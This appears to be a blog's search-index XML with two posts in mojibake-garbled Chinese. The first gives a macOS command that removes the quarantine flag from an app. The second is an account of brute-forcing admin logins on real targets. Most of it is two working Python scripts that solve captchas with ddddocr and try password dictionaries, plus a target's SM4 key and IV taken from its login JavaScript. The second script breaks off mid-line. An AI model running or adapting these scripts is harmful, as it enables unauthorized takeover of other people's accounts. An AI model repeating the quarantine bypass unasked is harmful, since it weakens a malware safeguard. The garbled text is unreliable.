<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>macæ–‡ä»¶æŸåæ— æ³•æ‰“å¼€è§£å†³æ–¹æ¡ˆ</title>
    <url>/posts/bfc83caa/</url>
    <content><![CDATA[<p>macOS å®‰è£…æ—¶çš„æŠ¥é”™é—®é¢˜</p>
<p><strong>macOS ä¸Šå®‰è£…è½¯ä»¶ï¼ˆFigma ä¸­æ–‡ç‰ˆå®¢æˆ·ç«¯ï¼‰æ—¶ï¼Œå¯èƒ½ä¼šä»¥ä¸‹å‡ ç§æŠ¥é”™ï¼š</strong></p>
<p>ï¼xxx å·²æŸåï¼Œæ— æ³•æ‰“å¼€ï¼Œå°†å®ƒç§»åˆ°åºŸçº¸ç¯“</p>
<p>ï¼æ‰“ä¸å¼€ xxxï¼Œå› ä¸ºå®ƒæ¥è‡ªèº«ä»½ä¸æ˜çš„å¼€å‘è€…</p>
<p>ï¼æ‰“ä¸å¼€ xxxï¼Œå› ä¸º Apple æ— æ³•æ£€æŸ¥å…¶æ˜¯å¦åŒ…å«æ¶æ„è½¯ä»¶</p>
<p>è¿™æ˜¯å› ä¸º macOS å¯ç”¨äº†æ–°çš„å®‰å…¨æœºåˆ¶ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬å®¢æˆ·ç«¯æ±‰åŒ–ç¨‹åºçš„é—®é¢˜ã€‚å¦‚æœä½ é‡åˆ°äº†ã€ŒXXXXå·²æŸåï¼Œæ— æ³•æ‰“å¼€ï¼Œå°†å®ƒç§»åˆ°åºŸçº¸ç¯“ã€ï¼Œå¯ä»¥æ‰“å¼€ ã€Œç»ˆç«¯ã€è¾“å…¥ <code>sudo xattr -rd com.apple.quarantine /Applications/XXXX\XXXX.app</code> ç„¶åå›è½¦è¾“å…¥å¼€æœºå¯†ç ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>åˆ©ç”¨ddddocrå®ç°éªŒè¯ç è¯†åˆ«ç™»å½•çˆ†ç ´</title>
    <url>/posts/125e1be2/</url>
    <content><![CDATA[<p>ddddocrï¼ˆ<a href="https://github.com/sml2h3/ddddocr%EF%BC%89">https://github.com/sml2h3/ddddocrï¼‰</a> å¯¹äºå¸¸è§„å­—æ¯+æ•°å­—çš„éªŒè¯ç  è¯†åˆ«ç‡è¿˜å¯ä»¥ï¼Œå‰æ®µæ—¶é—´åœ¨éƒ¨åˆ†é¡¹ç›®ä¸Šä¹Ÿç”¨ç›¸å…³æ–¹æ³•çˆ†å‡ºæ¥äº†è´¦å·å¯†ç ã€‚æœ‰ä¸ªæ¶å¿ƒçš„ç›®æ ‡ç®¡ç†å‘˜è´¦å·å¹¶é admin è€Œæ˜¯ addmin ğŸ˜  å¤ªæ¶å¿ƒäº†ï¼Œè¿™é‡Œç®€å•è®°å½•ä¸‹ç›¸å…³è„šæœ¬ã€å·²è„±æ•ã€‘ã€‚</p>
<p>æ•´ä½“æ€è·¯å°±æ˜¯å…ˆçœ‹è´¦å·å¯†ç çš„åŠ è§£å¯†æ–¹å¼ï¼Œå¦‚æœæ²¡æœ‰å°è´¦å·å¯ä»¥å¤§æ‰¹é‡è·‘å¯†ç ï¼Œå¦‚æœæœ‰å°è¯•æ¬¡æ•°ï¼Œè¶…è¿‡æ—¶é—´ä¼šé”å®šè´¦å·ï¼Œé‚£ä¹ˆå°±ä»…å¯è·‘3 4æ¬¡å¯†ç ï¼Œæ€»çš„æ¥è¯´è¿˜æ˜¯é è¿æ°”ã€‚</p>
<p>ä¹‹å‰æœ‰ä¸ªsm4çš„æ²¡è§£å‡ºæ¥åŠ å¯†ï¼Œè¿˜æ˜¯å¤ªèœäº† ğŸ˜­  åªåœ¨jsæºç ä¸­æ‰¾åˆ°äº†jsåŠ å¯†ï¼Œå·²çŸ¥ivå’Œkyè¿˜æ˜¯è§£ä¸å‡ºæ¥ QWQ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pwd = $.<span class="title function_">trim</span>($(<span class="string">&quot;#loginpassword&quot;</span>).<span class="title function_">val</span>());</span><br><span class="line">            <span class="keyword">var</span> sm4 = <span class="keyword">new</span> <span class="title class_">SM4Util</span>(<span class="string">&quot;lpUXFiIz0ITm0,cK&quot;</span>);</span><br><span class="line">               sm4.<span class="property">iv</span>=<span class="string">&quot;d1F9*RXrPFhi4NKC&quot;</span>;</span><br><span class="line">               <span class="keyword">if</span>(sm4.<span class="property">iv</span> == <span class="literal">null</span> || sm4.<span class="property">iv</span>.<span class="property">length</span> != <span class="number">16</span>)&#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;è¯·åˆ·æ–°é¡µé¢åé‡è¯•ï¼&quot;</span>);</span><br><span class="line">                location.<span class="title function_">reload</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">var</span> sm4String = sm4.<span class="title function_">encryptData_CBC</span>(pwd);</span><br><span class="line">                <span class="keyword">var</span> encoderpassword = self.<span class="title function_">btoa</span>(sm4String);</span><br><span class="line">                   $(<span class="string">&quot;#loginpassword&quot;</span>).<span class="title function_">val</span>(encoderpassword);</span><br><span class="line">                $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">submit</span>();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p><a href="31f3faaa3030ece464bfa58d4e43ae77.png"></a></p>
<h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>(<span class="params">ocr, baseurl, session</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¯†åˆ«å‡ºç™»å½•æ¥å£ä¸­å›¾åƒéªŒè¯ç ä¸Šçš„å­—ç¬¦&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># è·å–å½“å‰æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</span></span><br><span class="line">    current_timestamp = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;baseurl&#125;</span>/crm/imageServlet?<span class="subst">&#123;current_timestamp&#125;</span>&quot;</span>  <span class="comment"># åŠ¨æ€æ„å»º URL</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è¯·æ±‚éªŒè¯ç çš„URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ä½¿ç”¨ session å‘é€ GET è¯·æ±‚</span></span><br><span class="line">        response = session.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥å“åº”çŠ¶æ€ç </span></span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç : <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ‰“å°å“åº”å†…å®¹ä»¥è°ƒè¯•</span></span><br><span class="line">        <span class="comment"># print(&quot;å“åº”å†…å®¹ï¼ˆéƒ¨åˆ†ï¼‰:&quot;, response.content[:100])  # æ‰“å°å‰100ä¸ªå­—èŠ‚ï¼Œé¿å…è¾“å‡ºè¿‡é•¿</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨ ddddocr è¯†åˆ«éªŒè¯ç </span></span><br><span class="line">        code = ocr.classification(response.content)  <span class="comment"># ç›´æ¥ä¼ é€’å›¾åƒçš„äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œè¯†åˆ«</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è¯†åˆ«å‡ºçš„éªŒè¯ç : <span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘ç”Ÿå¼‚å¸¸: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm3_hash</span>(<span class="params">passwd</span>):</span><br><span class="line">    <span class="comment"># å°†è¾“å…¥çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼</span></span><br><span class="line">    password_bytes = passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># ä½¿ç”¨SM3è¿›è¡Œå“ˆå¸Œè®¡ç®—ï¼Œsm3.sm3_hash()éœ€è¦çš„æ˜¯å­—èŠ‚åˆ—è¡¨</span></span><br><span class="line">    password_hash = sm3.sm3_hash(func.bytes_to_list(password_bytes))</span><br><span class="line">    <span class="keyword">return</span> password_hash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">ocr, loginUrl, username, password, session</span>):</span><br><span class="line">    captcha = get_code(ocr, <span class="string">&quot;http://&lt;IP&gt;:60522&quot;</span>, session)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> captcha:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;éªŒè¯ç è¯†åˆ«å¤±è´¥ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨ SM3 åŠ å¯†å¯†ç ï¼Œå¹¶å°†å…¶ä¸éªŒè¯ç ä¸€èµ·å‘é€</span></span><br><span class="line">    password_hash = sm3_hash(password)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨å­—å…¸å½¢å¼çš„ data å‚æ•°</span></span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password_hash,</span><br><span class="line">        <span class="string">&quot;vercode&quot;</span>: captcha</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&lt;IP&gt;:60522&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://&lt;IP&gt;:60522&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://&lt;IP&gt;:60522/crm/login&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="comment"># ä¸è¦æ‰‹åŠ¨è®¾ç½® Cookieï¼Œç”± session ç®¡ç†</span></span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ä½¿ç”¨ session å‘é€ POST è¯·æ±‚</span></span><br><span class="line">        response = session.post(url=loginUrl, data=param, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ç™»å½•è¯·æ±‚å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># ç¤ºä¾‹ç”¨æ³•</span></span><br><span class="line">    loginUrl = <span class="string">&quot;http://&lt;IP&gt;:60522/crm/login&quot;</span></span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n================================================================================\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªä¼šè¯å¯¹è±¡</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»å–å¯†ç å­—å…¸æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;passwd.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> num, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(f):</span><br><span class="line">            sys.stdout.write(<span class="string">f&quot;\ræ­£åœ¨æ‰§è¡Œç¬¬ <span class="subst">&#123;num + <span class="number">1</span>&#125;</span> æ¡&quot;</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            value = value.strip()  <span class="comment"># å»é™¤æ¢è¡Œç¬¦</span></span><br><span class="line">            response = login(ocr, loginUrl, <span class="string">&#x27;addmin&#x27;</span>, value, session)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å¦‚æœå“åº”å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># å¦‚æœå“åº”å†…å®¹åŒ…å« &quot;éªŒè¯ç é”™è¯¯&quot;ï¼Œåˆ™é‡æ–°å°è¯•</span></span><br><span class="line">            <span class="keyword">while</span> <span class="string">&quot;éªŒè¯ç é”™è¯¯&quot;</span> <span class="keyword">in</span> response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç é”™è¯¯ï¼Œé‡æ–°å°è¯•: <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">                response = login(ocr, loginUrl, <span class="string">&#x27;addmin&#x27;</span>, value, session)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># æ£€æŸ¥å“åº”å†…å®¹é•¿åº¦æˆ–å†…å®¹</span></span><br><span class="line">            content = response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line">            <span class="comment"># æ ¹æ®å®é™…å“åº”å†…å®¹è°ƒæ•´æ¡ä»¶</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ç™»å½•æˆåŠŸ&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] å“åº”å†…å®¹: &quot;</span> + content)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] è´¦å·å¯†ç : addmin:<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># ç™»å½•æˆåŠŸï¼Œé€€å‡ºå¾ªç¯</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;è´¦æˆ·æˆ–å¯†ç ä¸æ­£ç¡®&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="comment"># å¯†ç é”™è¯¯ï¼Œç»§ç»­å°è¯•</span></span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># å…¶ä»–æƒ…å†µï¼Œæ‰“å°å“åº”å†…å®¹</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+] å“åº”å†…å®¹: &quot;</span> + content)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] è´¦å·å¯†ç : addmin:<span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            response.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="part-2"><a href="#part-2" class="headerlink" title="part 2"></a>part 2</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦ç”¨å®‰å…¨è¯·æ±‚è­¦å‘Šï¼ˆä¸æ¨èï¼Œé™¤éä½ ç¡®ä¿¡ç›®æ ‡æœåŠ¡å™¨æ˜¯å®‰å…¨çš„ï¼‰</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å¯¹è¾“å…¥æ–‡æœ¬è¿›è¡ŒåŒé‡ MD5 åŠ å¯†&quot;&quot;&quot;</span></span><br><span class="line">    first_md5 = hashlib.md5(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    second_md5 = hashlib.md5(first_md5.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> second_md5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>(<span class="params">ocr, baseurl, session</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è¯†åˆ«ç™»å½•æ¥å£ä¸­çš„å›¾åƒéªŒè¯ç &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># è·å–å½“å‰æ—¶é—´æˆ³ï¼ˆæ¯«ç§’ï¼‰</span></span><br><span class="line">    current_timestamp = <span class="built_in">int</span>(time.time() * <span class="number">1000</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;baseurl&#125;</span>/socialorg/checkImg/getCode.action?time=<span class="subst">&#123;current_timestamp&#125;</span>&quot;</span>  <span class="comment"># åŠ¨æ€æ„å»º URL</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;è¯·æ±‚éªŒè¯ç çš„URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ä½¿ç”¨ session å‘é€ GET è¯·æ±‚</span></span><br><span class="line">        response = session.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æ£€æŸ¥å“åº”çŠ¶æ€ç </span></span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;è¯·æ±‚éªŒè¯ç å¤±è´¥ï¼ŒçŠ¶æ€ç : <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨ ddddocr è¯†åˆ«éªŒè¯ç </span></span><br><span class="line">        code = ocr.classification(response.content)  <span class="comment"># ç›´æ¥ä¼ é€’å›¾åƒçš„äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œè¯†åˆ«</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è¯†åˆ«å‡ºçš„éªŒè¯ç : <span class="subst">&#123;code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è·å–éªŒè¯ç æ—¶å‘ç”Ÿå¼‚å¸¸: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">ocr, loginUrl, username, password, session</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°è¯•ç™»å½•&quot;&quot;&quot;</span></span><br><span class="line">    captcha = get_code(ocr, <span class="string">&quot;http://&lt;IP&gt;:8088&quot;</span>, session)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> captcha:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;éªŒè¯ç è¯†åˆ«å¤±è´¥ï¼&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨åŒé‡ MD5 åŠ å¯†å¯†ç </span></span><br><span class="line">    password_hash = double_md5(password)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ„å»ºè¯·æ±‚å‚æ•°</span></span><br><span class="line">    param = &#123;</span><br><span class="line">        <span class="string">&quot;netUserId&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;pwd&quot;</span>: password_hash,</span><br><span class="line">        <span class="string">&quot;checkCode&quot;</span>: captcha</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&lt;IP&gt;:8088&quot;</span>,  <span class="comment"># ç¡®ä¿ Host å¤´éƒ¨ä¸ loginUrl ä¸€è‡´</span></span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/plain, */*; q=0.01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded;charset=UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://&lt;IP&gt;:8088&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://&lt;IP&gt;:8088/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="comment"># ä¸è¦æ‰‹åŠ¨è®¾ç½® Cookieï¼Œç”± session ç®¡ç†</span></span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># ä½¿ç”¨ session å‘é€ POST è¯·æ±‚</span></span><br><span class="line">        response = session.post(url=loginUrl, data=param, headers=headers, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ç™»å½•è¯·æ±‚å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># ç™»å½• URLï¼Œç¡®ä¿åŒ…å«åè®®å‰ç¼€</span></span><br><span class="line">    loginUrl = <span class="string">&quot;http://&lt;IP&gt;:8088/socialorg/netlogin/netlogin.action&quot;</span></span><br><span class="line">    ocr = ddddocr.DdddOcr()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n================================================================================\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªä¼šè¯å¯¹è±¡</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆå§‹åŒ– OCR å®ä¾‹</span></span><br><span class="line">    <span class="comment"># ocr = ddddocr.DdddOcr()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»å–å¯†ç å­—å…¸æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;passwd.txt&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> num, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">                sys.stdout.write(<span class="string">f&quot;\ræ­£åœ¨æ‰§è¡Œç¬¬ <span class="subst">&#123;num&#125;</span> æ¡å¯†ç å°è¯•&quot;</span>)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                password = value.strip()  <span class="comment"># å»é™¤æ¢è¡Œç¬¦å’Œç©ºç™½å­—ç¬¦</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> password:</span><br><span class="line">                    <span class="keyword">continue</span>  <span class="comment"># è·³è¿‡ç©ºè¡Œ</span></span><br><span class="line"></span><br><span class="line">                response = login(ocr, loginUrl, <span class="string">&#x27;test&#x27;</span>, password, session)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœå“åº”ä¸ºç©ºï¼Œè·³è¿‡å½“å‰å¯†ç </span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    content = response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\nè§£ç å“åº”å†…å®¹æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœå“åº”å†…å®¹åŒ…å« &quot;noCheckCode&quot;ï¼Œåˆ™é‡æ–°å°è¯•è·å–éªŒè¯ç å¹¶ç™»å½•</span></span><br><span class="line">                <span class="keyword">while</span> <span class="string">&quot;noCheckCode&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[!] éªŒè¯ç é”™è¯¯ï¼Œé‡æ–°å°è¯•: å¯†ç =<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                    response = login(ocr, loginUrl, <span class="string">&#x27;test&#x27;</span>, password, session)</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        content = response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;\nè§£ç å“åº”å†…å®¹æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># å¦‚æœå“åº”å†…å®¹åŒ…å« &quot;noUserOrPwd&quot;ï¼Œåˆ™å¯†ç é”™è¯¯</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;noUserOrPwd&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[-] ç”¨æˆ·åæˆ–å¯†ç 